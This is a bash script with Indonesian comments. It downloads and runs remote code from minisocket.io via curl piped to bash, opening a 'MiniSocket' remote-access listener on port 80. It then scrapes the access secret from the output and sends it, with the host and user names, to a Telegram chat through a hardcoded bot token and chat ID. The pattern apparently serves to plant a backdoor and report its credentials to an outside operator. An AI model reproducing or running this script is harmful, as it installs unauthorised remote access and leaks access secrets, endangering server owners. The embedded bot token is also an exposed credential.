#!/bin/bash

# Telegram Config
TG_BOT_TOKEN="8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs"
TG_CHAT_ID="1142721678"

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

echo "🚀 Menjalankan MiniSocket..."

# Jalankan MiniSocket dan tangkap SELURUH output
OUTPUT=$(MINI_PORT=80 bash -c "$(curl -fsSL https://minisocket.io/bin/x)" 2>&1)

EXIT_CODE=$?

if echo "$OUTPUT" | grep -qE "secret|Secret|SECRET"; then
    # Ambil secret (biasanya muncul sebagai -s xxxx atau "Your secret is")
    SECRET=$(echo "$OUTPUT" | grep -oE '[-]?s[[:space:]]+[A-Za-z0-9]+' | awk '{print $2}' | head -n1)
    [[ -z "$SECRET" ]] && SECRET=$(echo "$OUTPUT" | grep -oE '[A-Za-z0-9]{8,}' | head -n1)

    MSG="🟢 <b>MiniSocket Berhasil!</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
🔌 <b>Port:</b> <code>80</code>
🔑 <b>Secret:</b> <code>${SECRET:-Tidak terdeteksi}</code>
✅ Status: Running
━━━━━━━━━━━━━━━"
    
    echo "$MSG" | tee output.txt
    send_telegram "$MSG"
    echo "Secret Key: $SECRET"
else
    MSG="🔴 <b>MiniSocket Gagal</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname)@$(whoami)</code>
❌ Status: Failed
━━━━━━━━━━━━━━━
Output: $OUTPUT"
    
    echo "$MSG" | tee output.txt
    send_telegram "$MSG"
    echo "$OUTPUT"
fi
